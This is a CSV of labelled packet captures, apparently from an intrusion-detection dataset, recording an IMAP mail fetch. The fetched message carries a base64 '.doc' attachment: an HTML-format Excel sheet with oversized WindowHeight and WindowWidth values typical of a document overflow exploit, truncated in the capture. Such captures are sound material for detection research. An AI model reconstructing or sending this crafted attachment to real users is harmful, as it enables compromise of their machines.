sip,dip,sport,dport,prot,dsfield,ipflags,length,label,payload
175.45.176.3,149.171.126.16,22592,143,tcp,0x00,0x00,77,imap,"a003 SELECT ""INBOX""
"
149.171.126.16,175.45.176.3,143,22592,tcp,0x00,0x00,97,imap,"* 1 EXISTS
a003 OK [READ-WRITE] SELECT
"
175.45.176.3,149.171.126.16,22592,143,tcp,0x00,0x00,84,imap,"a004 FETCH 1:* (UID FLAGS)
"
149.171.126.16,175.45.176.3,143,22592,tcp,0x00,0x00,103,imap,"* 1 FETCH (UID 1 FLAGS (Seen))
a004 OK FETCH
"
175.45.176.3,149.171.126.16,22592,143,tcp,0x00,0x00,82,imap,"a005 FETCH 1 BODY.PEEK[]
"
149.171.126.16,175.45.176.3,143,22592,tcp,0x00,0x00,1516,imap,"* 1 FETCH (BODY[] {20100}
Message-ID: <4pUQXBHebKSehoJRETq1LbK1B>
Date: Tue, 17 Feb 2015 09:24:05 +1100
From: Fph2y9@mOcujlcHhUcUMcBHiWFlUexNlkSQTAP.gov
MIME-Version: 1.0
To: yhIPVF8TDfFqtPlOU0oRzgPMPyB@lEmEULnwszBo.gov
Subject: YezOcqZwyeR0NJsPb1pQ8M40
Content-Type: multipart/mixed; boundary=""_530742842162583109539032""

--_530742842162583109539032
Content-Type: text/plain
Content-Disposition: 7bit

qslBCLQdTUyxTgrLpYrtd
--_530742842162583109539032
Content-Type: application/octet-stream; name=xiHBpq92.dOc
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=""xiHBpq92.dOc""

PGh0bWwgeG1sbnM6dj0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTp2bWwi
DQp4bWxuczpvPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm9mZmljZTpv
ZmZpY2UiDQp4bWxuczp4PSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm9m
ZmljZTpleGNlbCI+DQoNCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj1Db250
ZW50LVR5cGUgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3Mt
MTI1MiI+DQo8bWV0YSBuYW1lPVByb2dJZCBjb250ZW50PUV4Y2VsLlNoZWV0
Pg0KPG1ldGEgbmFtZT1HZW5lcmF0b3IgY29udGVudD0iTWljcm9zb2Z0IEV4
Y2VsIDEwIj4NCjwhLS1baWYgIW1zb10+DQo8c3R5bGU+DQp2Oioge2JlaGF2
aW9yOnVybCgjZGVmYXVsdCNWTUwpO30NCm86KiB7YmVoYXZpb3I6dXJsKCNk
ZWZhdWx0I1ZNTCk7fQ0KeDoqIHtiZWhhdmlvcjp1cmwoI2RlZmF1bHQjVk1M
KTt9DQouc2hhcGUge2JlaGF2aW9yOnVybCgjZGVmYXVsdCNWTUwpO30NCjwv
c3R5bGU+DQo8IVtlbmRpZl0tLT48IS0tW2lmIGd0ZSBtc28gOV0+PHhtbD4N
CjxvOkRvY3VtZW50UHJvcGVydGllcz4NCjxvOkxhc3RBdXRob3I+VEowUnpD
YlNjdGhwVndLSk40OTBXdktmYmtINWE2UVBGZ2hCblRXS"
149.171.126.16,175.45.176.3,143,22592,tcp,0x00,0x00,1516,imap,"jFjN1RSQVVYNHdi
blg5QlozPC9vOkxhc3RBdXRob3I+DQo8bzpMYXN0U2F2ZWQ+MjAxMC0wOC0w
M1QwNToxOTo1MVo8L286TGFzdFNhdmVkPg0KPG86VmVyc2lvbj4xMC42ODU4
PC9vOlZlcnNpb24+DQo8L286RG9jdW1lbnRQcm9wZXJ0aWVzPg0KPG86T2Zm
aWNlRG9jdW1lbnRTZXR0aW5ncz4NCjxvOkRvd25sb2FkQ29tcG9uZW50cy8+
DQo8L286T2ZmaWNlRG9jdW1lbnRTZXR0aW5ncz4NCjwveG1sPjwhW2VuZGlm
XS0tPg0KDQo8IS0tW2lmIGd0ZSBtc28gOV0+PHhtbD4NCjx4OkV4Y2VsV29y
a2Jvb2s+DQo8eDpFeGNlbFdvcmtzaGVldHM+DQo8eDpFeGNlbFdvcmtzaGVl
dD4NCjx4Ok5hbWU+SncwaWVxQ052S3ZuU1BmbWNNZXFhM2QyRzNYTzFreXZj
UVFBN2xDQmw0eGZjTnl1Z2k1UkM8L3g6TmFtZT4NCjx4OldvcmtzaGVldE9w
dGlvbnM+DQo8eDpDb2RlTmFtZT5iOHhnc0pCSXZXWm1tRDhyd0t1T0ExcGs5
PC94OkNvZGVOYW1lPg0KPHg6U2VsZWN0ZWQvPg0KPHg6RG9Ob3REaXNwbGF5
R3JpZGxpbmVzLz4NCjx4OlByb3RlY3RDb250ZW50cz5GYWxzZTwveDpQcm90
ZWN0Q29udGVudHM+DQo8eDpQcm90ZWN0T2JqZWN0cz5GYWxzZTwveDpQcm90
ZWN0T2JqZWN0cz4NCjx4OlByb3RlY3RTY2VuYXJpb3M+RmFsc2U8L3g6UHJv
dGVjdFNjZW5hcmlvcz4NCjwveDpXb3Jrc2hlZXRPcHRpb25zPg0KPC94OkV4
Y2VsV29ya3NoZWV0Pg0KPC94OkV4Y2VsV29ya3NoZWV0cz4NCjx4OldpbmRv
d0hlaWdodD41OTE3Nzc1NzY0MjY2NzYyMzg0NDk3NDg1NTk1NTk3MDk2MjI4
OTExMzYxMDY3NjAyMjcwODcwNzYxMDA3MDgwMTg1NDYzMjQxMzQ2ODAyMDAx
NDIwNTc3Nzc0NDE0OTYwNzk0Mjc4ODkyNjYxNzA5NzA4MDQ4MDgxNTU4MjUw
NTE5MTM5OTU2NjY5MzU0Mjg2OTgyNTQ4NjkyMTIxOTIxODMyNjcwMzc0MTgw
MzI3MzYyOTUxMzE1MTg1ODMwNTU0NDYxNDE2MjQ1MDM2NzY3ODAwMTU3Njkw
NTM3OTQ4NDg2MDM0NTQ0MjI0MzE1MzA1MjE1OTQxOTE0NjM1NzYzNDEwOTIz
MjcwNzQ4MTE4MTkyNjgwNTI3NTYyNzE0NTgzNTUxMTk4MjkwMTA4NzQ4NTIw
OTU3MTM3NzI1MDg5ODI1OTQ0Nzk5OTU3Mzg5ODAxO"
149.171.126.16,175.45.176.3,143,22592,tcp,0x00,0x00,1516,imap,"TEzMDE4MTIxOTAwNTMy
MDQwMjk5OTMwODgxNzIzNTk3MDQyODEyOTI5ODczODkzNzk2Njk3NTQwNjg4
NDMwNjg5NzU1ODQzODUwODI4MDk5NjA3NDI0Nzc3MjkzMTY5OTE4NzQwMDEw
MDMyMjczODY0MTk3MDY0NzY0NDMyMDIzMTIzMTU1MzE4NzMzMTU4MjY5Nzcz
ODAwMDI0NTY5NDIzNDUzNjE2ODUwMjQ5MzgwNTcyMDI1NzczNTU1OTQzNDk5
MTk1NTkzOTQwNDY1Njg2MDI4NTI4MDMzMjQwMjg0MDM1MzU3NjA2NTA3MDg3
Mjk2Nzk1MjU1MjAzMjU2MjM1OTQxMzQ5NjIzMzYyNzMxMjc3MzA0Mjk5ODIw
MzE2NjM4ODgxNzYyNzc1OTQ0MjUyNzI1MzI2MTEwMTQ1MDU3NjEyMTg0OTkx
MjA0NzI3Nzg1NjY2Mjc5Mjc4MDgwMjk2MzI2Mzk2NTk1OTY1MjkxMDIxNjk1
MTI3NzU0MDA4OTAwNTQ0NjkyNzQ1OTEyNDAxNzMzODQ4MTk4OTE3MzY2NDc5
MzEyMzYzMzEwMzY3MzE1OTc5Mjg3MTM5NTMyNjk0MzMxMDY4NzA1MDY0MzYz
OTIxNTkzMzg3NTMzNjkxNTUzMzE4MjUxNTI3MDIzNDk5OTI4OTAwNzkxOTU0
MzczODcwMjA2NzIyNTE3NjMzMDUwNzIwNTM0Mzk2ODUxOTcxMTUxMjEzMzc3
ODgyMTE0MjQ2Njk4NjM2Njc1Mjc4ODc1NjAzNjUzNDQ5NjE2OTIwMzI2MTc3
NzMxODYzNzkzMzQ0MDg4OTgwODc4ODE0MTQ2MDQ1NzcwODY1NjQxODgxNzMx
NDIzMzE5NTUwMTI4MTg2ODk1NzA0MDUwNDMwNTY1NDU4NDkxNTg5MzM5NDA2
NTI3Mjk3MDk4Njk4NjI5MzE2NjU1Njg4NjkyNzY0MTc2NjA0ODEyMDk5NzQ5
OTQ4MzAwMjAyNjEzNjkyODQzOTg2MTMyOTE2NTY3NTk2MjQyNTM0MDA2NTU4
Mzk5ODMxODE1OTc2MDcxODA2OTU4ODc5NTE5MDYwMDQ3NzU4MDE5ODE4NTEx
MTExNTUyMDU5NDg0NjA4MjU5NjQyOTQwNzQ0NDg5OTQ5NDI0NTA1NjcyNDIz
ODQ4MjYwMTI4MTM4ODk5NDMwMzE4NDU4NDI4NzQxNDYyNzgxMDU0MTQ1MDUy
ODA0NjUyODgyNjc0Mjg4NzA1NDE2MjE1MzY3MjgxODkzMjEyMjE2NzcwOTMw
MTA5MTcyNDMwMDY1MzE5NDAzMDY0NDczNjA0MDE2NTI5NTkxMzM5MjI5NjE1
ODQ4NzE0NjEyNzI5NDgxNTY1MzM2Njk3NTczNTE1MDEyNjQyOTU2MDEwOTUx
MDkyMzY1MDQ0ODk5MjA3OTcwMzk0NzM0OTcxM"
149.171.126.16,175.45.176.3,143,22592,tcp,0x00,0x00,1516,imap,"TMzNDk3NzI4NjkxOTk2NDU0
MjMxNDcwNDk3NDQ2Mzg3NTM1NjI3NDgyMzEwNjE1MTQyOTM3MTcyMDMwNDA1
PC94OldpbmRvd0hlaWdodD4NCjx4OldpbmRvd1dpZHRoPjc2MTYwNzc4MTQ4
NTg5ODEyNTcyNzM3MDA0ODU4NDA2Mzc3ODQyMzUyOTAyNzgwNjEyODAwNzQ4
Mzk1NDYxNjIwNTUwMzY3MjYxNDIwNjE1NTE4NTY1MjYzMjUxODI1ODg1ODU4
OTEwODgwOTAwNTIxODk1MDM5MDY5OTYxMzIxNjE3Nzg2NjY4OTA2NDAxNzYx
MTY5MjY3ODM4MjkxMzkyNTQ0NDEyMTIwMzg2NTQyNTcwMDAwMTgwMTc0MTEw
ODUwMzUzMzM0MzYxNTQ5ODcwNzg4MjQ5NjkxNDU3NDg0OTMzNTEwNDc0ODc4
Mzc3MDY5ODE0NDg0MTQxMjQyOTk2OTYzODc1NDE4MDcyMDU4NTc3Nzc1NTY0
OTE2MjA3NTk3MzEyODcyMzg3MzA2NjUxNzA4NDgzNDQxNTkyMTExNzYwNzUx
NTI0MzQwNzIwODQzOTAyMzAwMDExNjY5MjUzNTQyNDM2NTY1NzgzNTQ5NTEz
OTMzMzUyMDcyNTExODYyNjU5NjY1MTM1MTQ1OTkwMzI3NzIyMzM4Nzk2MzMw
OTc0Mzk4NTIwNDcyNDY1NjQzOTIyNTg0NjI3Nzc3NTM4OTA2OTUwNjk0MjI3
ODg3MTgyNzI3MjQxMTQ3MDE2NjY5MDUwNjI0MTcwMDM1MTA2MjM4MTY1ODQ1
NzUyNTY5MzA5NDQ0NjM5NjU5NDU5MTk0MTExMzU1NDE2MTM0MzAxMjk3Mzc1
MDAzNTAwMzQwODkxNTg4MDA4OTU5OTUwODE3ODIzMTY5NjIyODcwMTkxNjA0
MjE3NDcwNDg1MDQ4NzQ2NDA0Mzc0MjAwMzgwOTExNzM2NTA2MDMyMDY2MjU5
MTExNzc0MTY4MzEyODk0NjE2MzIzMzIzOTc2Mjk5NTUyMzcxNjM1MjM4NjEx
NDI2NjMxNTgwMzIxMzkwNTI3MDI2MjEwMDE2MDEwMTg3MjQ0NzM2ODMxOTM3
NzY0Mjk3NTgxNzc5ODgwNzY3NDg4ODE4MTQ4NDQzMDg1NDM2MDg0MTM0MTQy
OTA4MDg1MTE3ODkxNzI4NzI1NjQzNzEwNDE5OTYxMjk3MDc2NzYxODU1Mzgx
NjE1ODM2MjUzOTEzODA4MDUzMzU2MDI1MDc0NDY5MTkyNDA5NjAzMzUwMjgx
MDEzOTQzMDI3ODY2ODU1MjcyODk0NDExODU3NjQyNDE5Mzg1MjQxNTY0NTM1
MjY1NzEyMjYwODQ5MjMxMjM1NTczMjc0NTY3NTA5MTQ2MjU0NzIyMDk4MTc0
MTUwNTYxMTc2NzcwMTg4NjA1MTYwOTQxN"
149.171.126.16,175.45.176.3,143,22592,tcp,0x00,0x00,1516,imap,"DYyMDU0OTM2MDYzMjE4MTI4OTk4
MzExMzA3ODAxNzExNTcyMjY0NjMwODMyNjcxNTQzMjIzNjcyODIxMTU0ODM1
NzI2ODI2OTk2MjU0NjU0ODQ1MTYyNzk0MDY0ODk1NjUwNjc5NDI2OTY4NjM0
NTA5Njg3MjkwOTUzNTYzNzg3ODg0MjM5MjM2NzUyODg4MTcyMjYyMTI4NjI1
NzQyNTI0ODkzODgwMDEzMjcwMTczNjgxMzAzODExNzYwNzE2NjM1MjUzMjUz
MDQ4NTY4NjQwMDI3NDkwNzYwMTYyODc3MTg1MjY0NTY0MjUyMTIyOTM2MzY4
NzAyMzU3Nzg2MzY0MzM0MjQ5OTMwMjM2MzU1Njk3ODkxODA3MDA1Mzg4MTE3
ODI1OTIwMDcwNDIzMzkzODE1MjM5NDU3MjA0ODA2NjYwNDk0ODUxNTc0Njc4
MjM0MjQ2NjM1MDAzMDM5MzM2NDA0Njc4Nzk2MDg5MTI3NTc1NDU1NjU5OTE0
NTkwMTI0MjE0OTY5NjE3MTc2NDU0NjQ2MjIwNjQ1MzY3NjEwMTQ1NTA1ODgz
ODIwNTMyMTU1MjAzNzc4NTQ2ODcxNTcwNTQ3Nzg0NjEzNzczMjg4MjQ3NjQ2
MjQyMTMyOTY0OTQwMzgzODgzNTYyMzMxNzU2NjkzNjgxNDUwNjQ1MDE2NzA1
MjI0NTYwMDk2MzM0MTA1NjA5ODU0MTg4NTc2NzQ0MDkwMTk3NDIwODM4ODMx
OTY1MDI0MDkwNzkzNzU2NjM0NDU2NzIzMTI4Nzk3NjQ5OTY3Mjk3NDM0NTI4
MjI1NjkyOTUzMzI5MTE3ODY3MjM0NjM4Mzc4MjE4ODIzNDU2MDQ4NjM3OTc1
OTI0ODEwOTM4NTU1MDQ0NzAwODI0NjAyMDI2NjgwNDY4MDI4NjIwMDIyNzA1
MDA0NTcyNDQ5OTgxMTA1ODE3MDUyMzY0Njk4ODQxMjAwNjE3NjQ3NzI2MzE4
ODAwMDA3OTU3MjE5NTgwMzI0NDk3MjQzNzc0NzI4NTQ0MzgzNzA2ODYyMDIw
NTM2ODIzNzgzMjAzNTEwNTk0NzY2MjA5NDI1NjQ4NjQwMDA1NTk5NzU5Mjgw
NDcyMzM2MDQ0MzY4OTQ2NDYwODgyNjA1ODAwMjkyMTA3NDYzODY1ODAyNzgw
NzI5OTgxMzQ2MDczMDA2MzIwMTYxMTUwNjc1NzIwMjQzOTQxNTA5NDU0OTE4
NTgwNzg2NjIyMTMzOTExNzY2NDY1MjEyNTA5MzIxODkxNzUxOTg1OTUyNzgw
MjM5NTMzNjkwMTE0MDA0MjU4MDM1NDE5MjY5ODgzMTY5MzgyMjA5NTU3Mjc3
MDM5MjY1Njk0MTcyMzg4ODI0NzYwODMwNDI1NDM4MTY3ODg0Njg3NDE1NDU4
OTQ3MTQzOTEyOTIxNDc3NzU1MDc4M"
